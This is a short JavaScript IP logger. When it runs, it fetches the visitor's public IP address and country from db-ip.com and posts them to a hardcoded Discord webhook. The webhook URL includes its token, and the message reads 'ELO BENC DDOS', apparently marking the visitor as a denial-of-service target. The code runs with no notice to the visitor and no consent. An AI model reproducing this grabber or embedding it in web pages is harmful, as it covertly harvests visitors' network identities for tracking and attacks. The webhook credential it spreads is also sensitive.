var webHookUrl = "https://discord.com/api/webhooks/1014764957918842960/w_C8yDldwoZUeQz1zuKNWANabZeDEKVviwDkeu3Cvfz01q5smLYvtypCc1IvEUcKzjLF";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "kutas 2000",
        avatar_url: "",
        content:    "**ELO BENC DDOS** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
